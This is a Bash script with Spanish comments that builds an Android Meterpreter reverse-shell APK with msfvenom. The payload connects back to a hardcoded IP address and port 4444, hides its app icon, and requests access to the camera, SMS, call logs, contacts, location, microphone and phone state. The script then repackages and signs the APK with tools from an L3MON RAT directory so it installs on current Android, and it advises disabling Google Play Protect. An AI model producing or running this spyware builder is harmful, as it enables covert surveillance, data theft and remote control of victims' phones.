#!/bin/bash

# Script para generar APK compatible con Android moderno
# Uso: ./generate_apk.sh <LHOST> <LPORT>

LHOST=${1:-"194.163.135.124"}
LPORT=${2:-"4444"}
APK_NAME="android_payload.apk"
TEMP_DIR="/tmp/apk_build_$(date +%s)"

echo "Generando APK con msfvenom..."
echo "LHOST: $LHOST"
echo "LPORT: $LPORT"

# Generar APK con msfvenom
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  AndroidWipeUserData=false \
  AndroidHideAppIcon=true \
  AndroidPermissionCamera=true \
  AndroidPermissionReadSms=true \
  AndroidPermissionSendSms=true \
  AndroidPermissionCallLog=true \
  AndroidPermissionReadContacts=true \
  AndroidPermissionAccessCoarseLocation=true \
  AndroidPermissionAccessFineLocation=true \
  AndroidPermissionRecordAudio=true \
  AndroidPermissionReadPhoneState=true \
  AndroidPermissionAccessNetworkState=true \
  AndroidPermissionInternet=true \
  -o $APK_NAME

if [ ! -f "$APK_NAME" ]; then
  echo "Error al generar APK con msfvenom"
  exit 1
fi

echo "APK generada. Aplicando parches de compatibilidad..."

# Parchear el APK para compatibilidad con Android moderno usando apktool
if command -v apktool &> /dev/null || [ -f "/root/L3MON-2/app/factory/apktool.jar" ]; then
  APKTOOL_JAR="/root/L3MON-2/app/factory/apktool.jar"
  SIGN_JAR="/root/L3MON-2/app/factory/sign.jar"

  if [ -f "$APKTOOL_JAR" ]; then
    mkdir -p "$TEMP_DIR"
    cp "$APK_NAME" "$TEMP_DIR/payload.apk"
    cd "$TEMP_DIR"

    java -jar "$APKTOOL_JAR" d payload.apk -o payload_src -f

    if [ -f "payload_src/apktool.yml" ]; then
      sed -i 's/minSdkVersion: .*/minSdkVersion: '\''21'\''/' payload_src/apktool.yml
      sed -i 's/targetSdkVersion: .*/targetSdkVersion: '\''34'\''/' payload_src/apktool.yml
    fi

    if [ -f "payload_src/AndroidManifest.xml" ]; then
      sed -i 's|<application |<application android:usesCleartextTraffic="true" |' payload_src/AndroidManifest.xml
    fi

    java -jar "$APKTOOL_JAR" b payload_src -o payload_repacked.apk

    if [ -f "payload_repacked.apk" ] && [ -f "$SIGN_JAR" ]; then
      java -jar "$SIGN_JAR" payload_repacked.apk
      cp payload_repacked.apk "$OLDPWD/$APK_NAME"
    elif [ -f "payload_repacked.apk" ]; then
      cp payload_repacked.apk "$OLDPWD/$APK_NAME"
    fi

    cd "$OLDPWD"
    rm -rf "$TEMP_DIR"
  fi
fi

echo ""
echo "APK generada: $APK_NAME"
echo "Tamaño: $(du -h $APK_NAME | cut -f1)"
echo ""
echo "NOTA: Si el APK no se instala, intenta:"
echo "1. Desactivar Google Play Protect antes de instalar"
echo "2. Activar 'Instalar apps desconocidas' para tu gestor de archivos"
echo "3. Si el APK del panel L3MON no conecta, verifica que el puerto $LPORT esté abierto y accesible desde el dispositivo"
